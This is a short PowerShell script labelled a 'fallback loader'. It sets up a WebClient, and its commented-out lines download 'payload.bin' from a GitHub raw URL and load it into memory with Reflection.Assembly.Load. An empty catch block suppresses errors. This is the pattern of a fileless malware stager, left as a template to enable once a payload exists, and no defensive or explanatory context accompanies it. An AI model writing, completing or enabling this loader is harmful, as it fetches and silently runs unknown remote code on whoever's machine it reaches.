# Simple fallback loader
try {
    $wc = New-Object System.Net.WebClient
    # If you ever add a .bin later, uncomment the line below
    # $data = $wc.DownloadData("https://raw.githubusercontent.com/brakedangola2/vagabond/refs/heads/main/payload.bin")
    # [System.Reflection.Assembly]::Load($data)
} catch {}
